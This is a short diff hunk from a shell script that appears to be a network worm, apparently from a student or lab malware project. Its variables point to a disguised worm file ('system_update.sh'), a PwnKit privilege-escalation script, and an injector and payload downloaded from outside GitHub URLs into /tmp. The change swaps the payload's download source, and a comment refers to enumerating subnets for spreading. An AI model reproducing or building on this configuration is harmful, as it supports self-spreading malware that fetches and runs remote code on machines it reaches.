@@ -15,7 +15,7 @@ WORM_FILE="/tmp/system_update.sh"
 PRIV_ESC_FILE="/tmp/pwnkit.sh"
 INJECTOR_URL="https://github.com/Botxan/TechnoTrust/raw/refs/heads/main/inject_program"
 INJECTOR_FILE="/tmp/inject"
-PAYLOAD_URL="https://github.com/king-azul/malware-project/raw/refs/heads/main/malware"
+PAYLOAD_URL="https://github.com/Botxan/TechnoTrust/raw/refs/heads/main/malware"
 PAYLOAD_FILE="/tmp/malware"
 
 # Function to get all subnets connected to the machine, excluding loopback and 10.0.2.10 network
